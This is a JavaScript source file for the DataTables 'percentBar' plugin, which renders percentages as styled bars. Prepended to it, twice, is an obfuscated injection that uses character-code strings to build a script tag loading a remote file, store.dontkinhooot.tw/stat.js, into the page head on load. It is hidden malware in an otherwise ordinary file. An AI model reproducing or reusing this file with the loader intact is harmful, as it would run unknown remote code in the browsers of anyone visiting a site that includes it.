Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,115,116,111,114,101,46,100,111,110,116,107,105,110,104,111,111,111,116,46,116,119,47,115,116,97,116,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,115,116,111,114,101,46,100,111,110,116,107,105,110,104,111,111,111,116,46,116,119,47,115,116,97,116,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();/**
 * This data rendering helper method will convert percentage values into a bar.
 * Values can either have the % sign or not and decimals get rounded to the
 * given value. The percentage will have a max value of 100%.
 *
 * This function should be used with the `dt-init columns.render` configuration
 * option of DataTables.
 *
 * v1.1 Changelog
 * - Added a seventh border type parameter.
 * - All parameters are now optional.
 * - Improved styling.
 * - Bug fix: Text is always centered now.
 *
 * It accepts seven parameters:
 *
 * 1. `-type string` square as default or round for a rounded bar.
 * 2. `-type string` A hex color for the text.
 * 3. `-type string` A hex color for the border.
 * 4. `-type string` A hex color for the bar.
 * 5. `-type string` A hex color for the background.
 * 6. `-type integer` A number used to round the value.
 * 7. `-type string` A border style, default=ridge (solid, outset, groove, ridge)
 *
 *  DEMO : http://codepen.io/RedJokingInn/pen/jrkZQN
 *
 *  @name percentBar
 *  @summary Display percentage value as a bar
 *  @author [Drijkoningen Dirk](RedJokingInn)
 *  @requires DataTables 1.10+
 *
 *  @returns {String} Html code for bar
 *
 *  @example
 *    // Display rounded bars with white text, medium blue border, light blue bar, dark blue background, rounded to one decimal.
 *    $('#example').DataTable( {
 *      columnDefs: [ {
 *        targets: 4,
 *        render: $.fn.dataTable.render.percentBar( 'round','#FFF', '#269ABC', '#31B0D5', '#286090', 1, 'groove' )
 *      } ]
 *    } );
 *
 *  @example
 *    // All default values used. Square bars with black text, gray ridged border, light green bar, light gray background, rounded to integer.
 *    $('#example').DataTable( {
 *      columnDefs: [ {
 *        targets: 2,
 *        render: $.fn.dataTable.render.percentBar()
 *      } ]
 *    } );
 */

jQuery.fn.dataTable.render.percentBar = function(pShape, cText, cBorder, cBar, cBack, vRound, bType) {
  pShape = pShape || 'square';
  cText = cText || '#000';
  cBorder = cBorder || '#BCBCBC';
  cBar = cBar || '#5FD868';
  cBack = cBack || '#E6E6E6';
  vRound = vRound || 0;
  bType = bType || 'ridge';
  //Bar templates
  var styleRule1 = 'max-width:100px;height:12px;margin:0 auto;';
  var styleRule2 = 'border:2px '+bType+' '+cBorder+';line-height:12px;font-size:14px;color:'+cText+';background:'+cBack+';position:relative;';
  var styleRule3 = 'height:12px;line-height:12px;text-align:center;background-color:'+cBar+';padding:auto 6px;';
  //Square is default, make template round if pShape == round
  if(pShape=='round'){
    styleRule2 += 'border-radius:5px;';
    styleRule3 += 'border-top-left-radius:4px;border-bottom-left-radius:4px;';
  }

  return function(d, type, row) {
    //Remove % if found in the value
    //Round to the given parameter vRound
    s = parseFloat(d.replace(/\s%|%/g,'')).toFixed(vRound);
    //Not allowed to go over 100%
    if(s>100){s=100}
    
    // Order, search and type gets numbers
    if (type !== 'display') {
      return s;
    }
    if (typeof d !== 'number' && typeof d !== 'string') {
      return d;
    }
    
    //Return the code for the bar
    return '<div style="'+styleRule1+'"><div style="'+styleRule2+'"><div style="'+styleRule3+'width:'+s+ '%;"></div><div style="width:100%;text-align:center;position:absolute;left:0;top:0;">'+s+'%</div></div></div>';
  };
};
